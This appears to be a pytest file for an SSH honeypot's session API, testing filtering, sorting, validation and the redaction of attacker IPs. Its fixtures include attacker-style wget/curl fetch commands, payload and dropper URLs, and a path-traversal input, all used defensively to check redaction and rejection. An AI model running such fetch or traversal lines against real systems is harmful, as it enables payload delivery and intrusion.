import json
from datetime import datetime, timedelta, timezone
from typing import Any

from src.models.command import Command
from src.models.download import Download
from src.models.geo_location import GeoLocation
from src.models.session import Session as HoneypotSession


def test_list_sessions(client: Any, seed_data: Any) -> None:
    response = client.get("/api/v1/sessions/")
    assert response.status_code == 200
    data = response.get_json()
    assert "items" in data
    assert "meta" in data
    assert data["meta"]["total"] == 2
    assert len(data["items"]) == 2


def test_list_sessions_no_src_ip_leak(client: Any, seed_data: Any) -> None:
    """Privacy contract: `src_ip` must never appear in list responses."""
    response = client.get("/api/v1/sessions/")
    assert response.status_code == 200
    assert b"src_ip" not in response.data
    for s in response.get_json()["items"]:
        assert "src_ip" not in s
        assert "country_code" in s
        assert "country" in s


def test_list_sessions_summary_classification_fields(
    client: Any, seed_data: Any
) -> None:
    del seed_data
    response = client.get("/api/v1/sessions/")
    assert response.status_code == 200
    by_id = {s["id"]: s for s in response.get_json()["items"]}
    assert by_id["sess-001"]["command_count"] == 1
    assert by_id["sess-001"]["has_successful_login"] is False
    assert by_id["sess-001"]["auth_attempt_count"] == 2
    assert by_id["sess-002"]["command_count"] == 0
    assert by_id["sess-002"]["has_successful_login"] is True
    assert by_id["sess-001"]["category"] == "active"
    assert by_id["sess-002"]["category"] == "login"


def test_category_field_agrees_with_filter(
    client: Any, seed_data: Any, failed_and_probe_seed: Any
) -> None:
    """The serialized `category` must match the SQL `?category=` filter for every
    class - guards the two from drifting (they encode the same partition)."""
    del seed_data, failed_and_probe_seed
    for cat in ("active", "login", "failed", "probe"):
        items = client.get(f"/api/v1/sessions/?category={cat}").get_json()["items"]
        assert items, f"expected at least one {cat} session"
        assert all(s["category"] == cat for s in items), cat


def test_list_sessions_category_active(client: Any, seed_data: Any) -> None:
    del seed_data
    response = client.get("/api/v1/sessions/?category=active")
    assert response.status_code == 200
    data = response.get_json()
    assert [s["id"] for s in data["items"]] == ["sess-001"]


def test_list_sessions_category_login(client: Any, seed_data: Any) -> None:
    del seed_data
    response = client.get("/api/v1/sessions/?category=login")
    assert response.status_code == 200
    data = response.get_json()
    assert [s["id"] for s in data["items"]] == ["sess-002"]


def test_list_sessions_category_failed_and_probe(
    client: Any, seed_data: Any, failed_and_probe_seed: Any
) -> None:
    """'failed' = login attempts made, none accepted, no commands.
    'probe'  = a bare connection with no auth attempts at all."""
    del seed_data, failed_and_probe_seed
    failed = client.get("/api/v1/sessions/?category=failed").get_json()
    assert [s["id"] for s in failed["items"]] == ["failsess001"]
    probe = client.get("/api/v1/sessions/?category=probe").get_json()
    assert [s["id"] for s in probe["items"]] == ["probesess01"]


def test_list_sessions_filter_country(client: Any, seed_data: Any) -> None:
    """Only sess-001 is geo-enriched (US); sess-002 has no geo row."""
    del seed_data
    response = client.get("/api/v1/sessions/?country=US")
    assert response.status_code == 200
    data = response.get_json()
    assert [s["id"] for s in data["items"]] == ["sess-001"]


def test_list_sessions_sort_country_puts_nulls_last(
    client: Any, seed_data: Any
) -> None:
    del seed_data
    response = client.get("/api/v1/sessions/?sort=country")
    assert response.status_code == 200
    ids = [s["id"] for s in response.get_json()["items"]]
    # US (sess-001) ahead of the geo-less sess-002 (NULL country sorts last).
    assert ids == ["sess-001", "sess-002"]


def test_list_sessions_sort_country_alphabetical_two_countries(
    client: Any, seed_data: Any, db_session: Any
) -> None:
    """Two geo-enriched countries exercise the A-Z primary ordering (the seed
    only has US-vs-NULL, so a reversed sort would still pass without this)."""
    del seed_data
    now = datetime.now(timezone.utc)
    db_session.add(
        HoneypotSession(
            id="ausess00001",
            src_ip="198.51.100.5",
            src_port=3,
            dst_port=22,
            protocol="ssh",
            started_at=now,
        )
    )
    db_session.add(
        GeoLocation(ip="198.51.100.5", country_code="AU", country="Australia")
    )
    db_session.flush()

    ids = [
        s["id"]
        for s in client.get("/api/v1/sessions/?sort=country").get_json()["items"]
    ]
    # Australia precedes United States; the geo-less sess-002 (NULL) sorts last.
    assert ids.index("ausess00001") < ids.index("sess-001") < ids.index("sess-002")


def test_list_sessions_sort_active_orders_by_command_count(
    client: Any, seed_data: Any
) -> None:
    del seed_data
    response = client.get("/api/v1/sessions/?sort=active")
    assert response.status_code == 200
    ids = [s["id"] for s in response.get_json()["items"]]
    assert ids == ["sess-001", "sess-002"]


def test_list_sessions_category_and_country_compose(
    client: Any, seed_data: Any
) -> None:
    del seed_data
    response = client.get("/api/v1/sessions/?category=active&country=US")
    assert response.status_code == 200
    assert [s["id"] for s in response.get_json()["items"]] == ["sess-001"]
    response = client.get("/api/v1/sessions/?category=login&country=US")
    assert response.get_json()["meta"]["total"] == 0


def test_list_sessions_rejects_invalid_filters(client: Any) -> None:
    assert client.get("/api/v1/sessions/?sort=bogus").status_code == 422
    assert client.get("/api/v1/sessions/?category=maybe").status_code == 422
    assert client.get("/api/v1/sessions/?country=USA").status_code == 422
    assert client.get("/api/v1/sessions/?has=bogus").status_code == 422


def test_list_sessions_summary_exposes_counters_and_interest(
    client: Any, seed_data: Any
) -> None:
    del seed_data
    response = client.get("/api/v1/sessions/")
    assert response.status_code == 200
    by_id = {s["id"]: s for s in response.get_json()["items"]}
    for field in (
        "n_commands",
        "n_downloads",
        "n_tcpip",
        "auth_success",
        "interest",
        "asn_org",
        "client_version",
    ):
        assert field in by_id["sess-001"]
    assert by_id["sess-001"]["n_commands"] == 0
    assert by_id["sess-001"]["interest"] == 0


def _make_session(
    db_session: Any,
    session_id: str,
    *,
    n_commands: int = 0,
    n_downloads: int = 0,
    n_tcpip: int = 0,
    auth_success: bool = False,
    started_at: Any,
    ended_at: Any = None,
) -> None:
    db_session.add(
        HoneypotSession(
            id=session_id,
            src_ip="203.0.113.10",
            src_port=1,
            dst_port=22,
            protocol="ssh",
            started_at=started_at,
            ended_at=ended_at,
            n_commands=n_commands,
            n_downloads=n_downloads,
            n_tcpip=n_tcpip,
            auth_success=auth_success,
        )
    )


def test_list_sessions_sort_interest(client: Any, db_session: Any) -> None:
    now = datetime.now(timezone.utc)
    # low: 0 -> interest 0; mid: 1 command + success -> 2+3=5; high: 1 download -> 5.
    _make_session(db_session, "sess-low", started_at=now)
    _make_session(
        db_session, "sess-mid", n_commands=1, auth_success=True, started_at=now
    )
    _make_session(db_session, "sess-high", n_downloads=2, started_at=now)
    db_session.flush()
    db_session.commit()

    response = client.get("/api/v1/sessions/?sort=interest&per_page=3")
    assert response.status_code == 200
    ids = [s["id"] for s in response.get_json()["items"]]
    interests = [s["interest"] for s in response.get_json()["items"]]
    assert interests == sorted(interests, reverse=True)
    assert ids.index("sess-high") < ids.index("sess-low")
    assert ids.index("sess-mid") < ids.index("sess-low")


def test_list_sessions_max_interest_is_global_unfiltered_ceiling(
    client: Any, db_session: Any
) -> None:
    """`max_interest` is the true dataset max, unaffected by filters/sort, so a
    session's normalized display score stays stable across views."""
    now = datetime.now(timezone.utc)
    # interest: 0, 2*1+3=5, 5*2=10 (highest).
    _make_session(db_session, "sess-low", started_at=now)
    _make_session(
        db_session, "sess-mid", n_commands=1, auth_success=True, started_at=now
    )
    _make_session(db_session, "sess-high", n_downloads=2, started_at=now)
    db_session.flush()
    db_session.commit()

    response = client.get("/api/v1/sessions/")
    assert response.status_code == 200
    data = response.get_json()
    assert "max_interest" in data
    assert data["max_interest"] == 10

    # A filtered/sorted view that excludes the highest-interest session still
    # reports the same global ceiling, not a locally-filtered one.
    filtered = client.get("/api/v1/sessions/?has=commands").get_json()
    assert filtered["max_interest"] == 10


def test_list_sessions_sort_duration(client: Any, db_session: Any) -> None:
    now = datetime.now(timezone.utc)

    _make_session(
        db_session, "sess-short", started_at=now, ended_at=now + timedelta(seconds=5)
    )
    _make_session(
        db_session, "sess-long", started_at=now, ended_at=now + timedelta(hours=1)
    )
    db_session.flush()
    db_session.commit()

    response = client.get("/api/v1/sessions/?sort=duration&per_page=2")
    assert response.status_code == 200
    ids = [s["id"] for s in response.get_json()["items"]]
    assert ids.index("sess-long") < ids.index("sess-short")


def test_list_sessions_has_filter_ands_tokens(client: Any, db_session: Any) -> None:
    now = datetime.now(timezone.utc)
    _make_session(db_session, "sess-cmd-only", n_commands=1, started_at=now)
    _make_session(
        db_session,
        "sess-cmd-and-success",
        n_commands=1,
        auth_success=True,
        started_at=now,
    )
    db_session.flush()
    db_session.commit()

    only_commands = client.get("/api/v1/sessions/?has=commands").get_json()["items"]
    ids = {s["id"] for s in only_commands}
    assert {"sess-cmd-only", "sess-cmd-and-success"} <= ids

    commands_and_success = client.get(
        "/api/v1/sessions/?has=commands,success"
    ).get_json()["items"]
    ids2 = {s["id"] for s in commands_and_success}
    assert "sess-cmd-and-success" in ids2
    assert "sess-cmd-only" not in ids2


def test_list_sessions_filters_no_src_ip_leak(client: Any, seed_data: Any) -> None:
    """Privacy contract holds across the filtered/sorted code paths too."""
    del seed_data
    response = client.get("/api/v1/sessions/?category=login&sort=country")
    assert response.status_code == 200
    assert b"src_ip" not in response.data


def test_session_detail_redacts_ips_in_commands_and_downloads(
    client: Any, db_session: Any
) -> None:
    """C2 / payload IPs an attacker typed must be blotted server-side, so the raw
    IP never reaches the API response (nor /redoc, /swagger, or a direct curl)."""
    now = datetime.now(timezone.utc)
    db_session.add(
        HoneypotSession(
            id="sessIP00001",
            src_ip="203.0.113.50",
            src_port=4,
            dst_port=22,
            protocol="ssh",
            started_at=now,
        )
    )
    db_session.flush()
    db_session.add(
        Command(
            session_id="sessIP00001",
            input="wget https://34.11.136.102/x; curl http://2130706433/y",
            success=True,
            timestamp=now,
        )
    )
    db_session.add(
        Download(
            session_id="sessIP00001",
            url="http://185.220.101.5:8080/payload.sh",
            outfile="downloads/p",
            sha256="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            timestamp=now,
        )
    )
    db_session.flush()

    response = client.get("/api/v1/sessions/sessIP00001")
    assert response.status_code == 200
    # No IP literal of any kind survives in the raw response bytes.
    for leaked in (b"34.11.136.102", b"2130706433", b"185.220.101.5"):
        assert leaked not in response.data, leaked
    body = response.get_json()
    assert "<ip>" in body["commands"][0]["input"]
    assert "<ip>" in body["downloads"][0]["url"]


def test_session_detail_hides_failed_downloads(client: Any, db_session: Any) -> None:
    """A failed fetch is stored for its URL alone (sha256 IS NULL) and must not
    reach the transcript - there is no captured file to show for it."""
    now = datetime.now(timezone.utc)
    db_session.add(
        HoneypotSession(
            id="sessFAIL0001",
            src_ip="203.0.113.51",
            src_port=4,
            dst_port=22,
            protocol="ssh",
            started_at=now,
        )
    )
    db_session.flush()
    db_session.add(
        Download(
            session_id="sessFAIL0001",
            url="http://dropper.example.com/x.sh",
            outfile=None,
            sha256=None,
            timestamp=now,
        )
    )
    db_session.add(
        Download(
            session_id="sessFAIL0001",
            url=None,
            outfile="downloads/p",
            sha256="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            timestamp=now,
        )
    )
    db_session.flush()

    body = client.get("/api/v1/sessions/sessFAIL0001").get_json()
    assert len(body["downloads"]) == 1
    assert body["downloads"][0]["sha256"] is not None
    assert (
        b"dropper.example.com" not in client.get("/api/v1/sessions/sessFAIL0001").data
    )


def test_sessions_filtered_by_sha256(client: Any, db_session: Any) -> None:
    """?sha256= returns only sessions that captured that payload.

    A session holding two rows for the same digest must appear once - the
    predicate is EXISTS, not a join - and a failed fetch (sha256 NULL) can
    never match.
    """
    now = datetime.now(timezone.utc)
    digest = "a" * 64
    other = "b" * 64
    for sid, ip in (("sessSHA00001", "203.0.113.60"), ("sessSHA00002", "203.0.113.61")):
        db_session.add(
            HoneypotSession(
                id=sid,
                src_ip=ip,
                src_port=4,
                dst_port=22,
                protocol="ssh",
                started_at=now,
            )
        )
    db_session.flush()
    # Two rows, same digest, same session: the page must not double it.
    for _ in range(2):
        db_session.add(
            Download(
                session_id="sessSHA00001",
                url=None,
                outfile="downloads/p",
                sha256=digest,
                timestamp=now,
            )
        )
    db_session.add(
        Download(
            session_id="sessSHA00002",
            url=None,
            outfile="downloads/q",
            sha256=other,
            timestamp=now,
        )
    )
    # A failed fetch on the second session - stored for its URL, sha256 NULL.
    db_session.add(
        Download(
            session_id="sessSHA00002",
            url="http://dropper.example.com/x.sh",
            outfile=None,
            sha256=None,
            timestamp=now,
        )
    )
    db_session.flush()

    body = client.get(f"/api/v1/sessions/?sha256={digest}").get_json()
    assert [s["id"] for s in body["items"]] == ["sessSHA00001"]
    assert body["meta"]["total"] == 1

    # An unknown digest matches nothing rather than everything.
    assert client.get(f"/api/v1/sessions/?sha256={'c' * 64}").get_json()["items"] == []

    # Not lowercase hex of length 64 -> rejected by the schema, never reaching SQL.
    assert client.get("/api/v1/sessions/?sha256=nothex").status_code == 422
    assert client.get(f"/api/v1/sessions/?sha256={digest.upper()}").status_code == 422


def test_get_session_not_found(client: Any) -> None:
    response = client.get("/api/v1/sessions/nonexistent")
    assert response.status_code == 404
    data = response.get_json()
    # flask_smorest abort(404, message=...) produces {code, status, message}
    assert "message" in data or "errors" in data


def test_get_session_detail_with_seed_id(client: Any, seed_data: Any) -> None:
    del seed_data
    response = client.get("/api/v1/sessions/sess-001")
    assert response.status_code == 200
    body = response.get_json()
    assert body["id"] == "sess-001"
    assert "src_ip" not in body


def test_get_session_malformed_id(client: Any) -> None:
    response = client.get("/api/v1/sessions/..%2F..%2Fetc")
    assert response.status_code in (404, 422)


def test_session_detail_no_src_ip_leak(
    client: Any, seed_data: Any, db_session: Any
) -> None:
    """Privacy contract: `src_ip` must never appear in detail responses.

    Seeded ids contain hyphens (rejected by the route's regex), so we insert a
    matching-pattern session for this assertion.
    """
    db_session.add(
        HoneypotSession(
            id="sessAAA001",
            src_ip="203.0.113.7",
            src_port=44444,
            dst_port=22,
            protocol="ssh",
            started_at=datetime.now(timezone.utc),
        )
    )
    db_session.flush()

    response = client.get("/api/v1/sessions/sessAAA001")
    assert response.status_code == 200
    assert b"src_ip" not in response.data
    body = response.get_json()
    assert "src_ip" not in body
    assert "country_code" in body
    assert "country" in body


def test_per_page_is_capped(client: Any, seed_data: Any) -> None:
    # per_page > 100 fails marshmallow validate.Range(max=100), surfacing 422
    response = client.get("/api/v1/sessions/?per_page=99999")
    assert response.status_code == 422


def test_sessions_invalid_page_returns_422(client: Any) -> None:
    response = client.get("/api/v1/sessions/?page=abc")
    assert response.status_code == 422
    data = response.get_json()
    assert "errors" in data or "code" in data


def test_sessions_invalid_session_id_returns_422(client: Any) -> None:
    response = client.get("/api/v1/sessions/!!!")
    assert response.status_code == 422


def test_sessions_unknown_session_id_returns_404(client: Any) -> None:
    response = client.get("/api/v1/sessions/aaaaaaaa")
    assert response.status_code == 404
    data = response.get_json()
    blob = (data.get("message") or "") + json.dumps(data)
    assert "Session" in blob or "aaaaaaaa" in blob


def test_session_detail_geo_enriched(client: Any, seed_data: Any) -> None:
    """A geo-enriched session exposes country/country_code, never src_ip.

    Exercises the populated GeoLocation join branch (seed gives sess-001 a US
    geo row) that the privacy gate would otherwise never cover.
    """
    del seed_data
    response = client.get("/api/v1/sessions/sess-001")
    assert response.status_code == 200
    assert b"src_ip" not in response.data
    body = response.get_json()
    assert body["country"] == "United States"
    assert body["country_code"] == "US"
    assert "src_ip" not in body


def test_list_sessions_filter_q_prefix_match(client: Any, db_session: Any) -> None:
    """q= matches only ids carrying that hex prefix, not ids that merely
    contain it elsewhere."""
    now = datetime.now(timezone.utc)
    _make_session(db_session, "abc123001100", started_at=now)
    _make_session(db_session, "abc999002200", started_at=now)
    _make_session(
        db_session, "aaabc1230033", started_at=now
    )  # "abc123" mid-id, not prefix
    db_session.flush()
    db_session.commit()

    response = client.get("/api/v1/sessions/?q=abc")
    assert response.status_code == 200
    ids = {s["id"] for s in response.get_json()["items"]}
    assert ids == {"abc123001100", "abc999002200"}


def test_list_sessions_filter_q_no_matches(client: Any, db_session: Any) -> None:
    now = datetime.now(timezone.utc)
    _make_session(db_session, "abc123001100", started_at=now)
    db_session.flush()
    db_session.commit()

    response = client.get("/api/v1/sessions/?q=ffffff")
    assert response.status_code == 200
    data = response.get_json()
    assert data["items"] == []
    assert data["meta"]["total"] == 0
    assert data["meta"]["pages"] == 0


def test_list_sessions_filter_q_rejects_invalid(client: Any) -> None:
    # Uppercase and non-hex characters fail the lowercase-hex-only regex.
    assert client.get("/api/v1/sessions/?q=ABC123").status_code == 422
    assert client.get("/api/v1/sessions/?q=xyz123").status_code == 422
    # Below the 2-character floor.
    assert client.get("/api/v1/sessions/?q=a").status_code == 422


def test_list_sessions_filter_q_composes_with_has_and_country(
    client: Any, db_session: Any
) -> None:
    """q= + has= + country= all narrow together - only the row matching every
    filter survives, which also pins meta.total to the item count (the shared
    conditions list is what keeps the count and page queries in agreement)."""
    now = datetime.now(timezone.utc)
    db_session.add_all(
        [
            HoneypotSession(
                id="aa11000001aa",
                src_ip="198.51.100.11",
                src_port=1,
                dst_port=22,
                protocol="ssh",
                started_at=now,
                n_commands=1,
            ),
            # Same prefix + country, but no commands -> fails has=commands.
            HoneypotSession(
                id="aa11000002aa",
                src_ip="198.51.100.12",
                src_port=2,
                dst_port=22,
                protocol="ssh",
                started_at=now,
                n_commands=0,
            ),
            # Same prefix + commands, but wrong country -> fails country=US.
            HoneypotSession(
                id="aa11000003aa",
                src_ip="198.51.100.13",
                src_port=3,
                dst_port=22,
                protocol="ssh",
                started_at=now,
                n_commands=1,
            ),
            # Right country + commands, but wrong prefix -> fails q=aa11.
            HoneypotSession(
                id="bb22000004aa",
                src_ip="198.51.100.14",
                src_port=4,
                dst_port=22,
                protocol="ssh",
                started_at=now,
                n_commands=1,
            ),
        ]
    )
    # Flushed one at a time: SQLAlchemy batches same-table pending inserts into
    # one insertmanyvalues statement, and its sentinel matching cannot line the
    # returned INET primary keys back up with the string values sent. conftest
    # flushes per GeoLocation for the same reason.
    for ip, cc, name in (
        ("198.51.100.11", "US", "United States"),
        ("198.51.100.12", "US", "United States"),
        ("198.51.100.13", "RU", "Russia"),
        ("198.51.100.14", "US", "United States"),
    ):
        db_session.add(GeoLocation(ip=ip, country_code=cc, country=name))
        db_session.flush()
    db_session.commit()

    response = client.get("/api/v1/sessions/?q=aa11&has=commands&country=US")
    assert response.status_code == 200
    data = response.get_json()
    assert [s["id"] for s in data["items"]] == ["aa11000001aa"]
    assert data["meta"]["total"] == len(data["items"])


def test_list_sessions_has_none_filters_zero_interest(
    client: Any, db_session: Any
) -> None:
    now = datetime.now(timezone.utc)
    _make_session(db_session, "sess-idle-001", started_at=now)
    _make_session(db_session, "sess-busy-001", n_commands=1, started_at=now)
    db_session.flush()
    db_session.commit()

    response = client.get("/api/v1/sessions/?has=none")
    assert response.status_code == 200
    items = response.get_json()["items"]
    ids = {s["id"] for s in items}
    assert "sess-idle-001" in ids
    assert "sess-busy-001" not in ids
    assert all(s["interest"] == 0 for s in items)


def test_list_sessions_has_none_combined_with_other_is_422(client: Any) -> None:
    """ "none" AND anything else is always the empty set - rejected outright
    rather than silently returning zero rows."""
    assert client.get("/api/v1/sessions/?has=none,commands").status_code == 422


def test_list_sessions_page_cap_covers_every_reachable_page(client: Any) -> None:
    """Page ceiling must accommodate the deepest reachable page; at 40/page, 543k
    sessions is 13,576 pages."""
    assert client.get("/api/v1/sessions/?per_page=40&page=13576").status_code == 200
    assert client.get("/api/v1/sessions/?per_page=40&page=50000").status_code == 200
    assert client.get("/api/v1/sessions/?per_page=40&page=50001").status_code == 422
